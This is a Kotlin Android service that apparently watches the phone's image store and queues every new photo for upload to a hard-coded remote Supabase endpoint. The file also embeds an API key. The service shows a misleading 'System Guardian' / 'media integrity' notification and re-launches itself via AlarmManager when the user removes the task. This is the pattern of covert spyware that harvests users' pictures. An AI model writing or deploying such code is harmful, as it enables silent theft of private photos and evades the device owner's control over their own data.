package com.universal.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File

class ImageMonitorService : Service() {
    private val CHANNEL_ID = "ImageMonitorChannel"
    private val SUPABASE_URL = "https://xvldfsmxskhemkslsbym.supabase.co/functions/v1/upload-image"
    private val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"
    
    private lateinit var observer: ContentObserver

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Guardian Active")
            .setContentText("Monitoring media integrity...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            startForeground(1, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }
        startMonitoring()
        recoveryScan()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        val restartServicePendingIntent = android.app.PendingIntent.getService(
            applicationContext, 1, restartServiceIntent, 
            android.app.PendingIntent.FLAG_ONE_SHOT or android.app.PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun recoveryScan() {
        val prefs = getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
        val lastId = prefs.getLong("last_image_id", -1)
        if (lastId != -1L) {
            DebugLogger.log("RECOVERY", "Checking status of image ID: $lastId")
            Uploader.startPolling(this, lastId.toString())
        }
    }

    private var lastEventTime = 0L
    private var isObserverRegistered = false
    private fun startMonitoring() {
        if (isObserverRegistered) return
        DebugLogger.log("SERVICE", "Observer initiated on MediaStore")
        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                val prefs = getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
                if (!prefs.getBoolean("is_active", false)) return

                val now = System.currentTimeMillis()
                if (now - lastEventTime < 2000) return
                lastEventTime = now
                DebugLogger.log("EVENT", "Media change detected: $uri")
                processNewImages()
            }
        }
        contentResolver.registerContentObserver(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer)
        isObserverRegistered = true
    }

    private fun processNewImages() {
        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
        
        val prefs = getSharedPreferences("monitor_prefs", Context.MODE_PRIVATE)
        val lastId = prefs.getLong("last_image_id", -1)
        
        contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, "${MediaStore.Images.Media._ID} > ?", arrayOf(lastId.toString()), sortOrder)?.use { cursor ->
            var maxId = lastId
            val newFiles = mutableListOf<File>()
            
            while (cursor.moveToNext()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                
                DebugLogger.log("MONITOR", "Scanning ID: $id (Last processed: $lastId)")
                if (id > lastId) {
                    if (id > maxId) maxId = id
                    val file = File(path)
                    if (file.exists() && file.length() > 1000) { // Ignore tiny thumbnails/temp files
                        newFiles.add(file)
                    }
                }
            }
            
            if (newFiles.isNotEmpty()) {
                // Save the new maxId immediately to prevent the next observer trigger from seeing these same files
                prefs.edit().putLong("last_image_id", maxId).apply()
                
                // Delay the actual upload slightly to ensure the file is fully written to disk by the system
                Handler(Looper.getMainLooper()).postDelayed({
                    Uploader.enqueueFiles(this@ImageMonitorService, newFiles)
                }, 1000)
            }
        }
    }



    private fun createNotificationChannel() {
        val serviceChannel = NotificationChannel(CHANNEL_ID, "Monitor Service", NotificationManager.IMPORTANCE_HIGH)
        serviceChannel.lockscreenVisibility = android.app.Notification.VISIBILITY_PUBLIC
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(serviceChannel)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}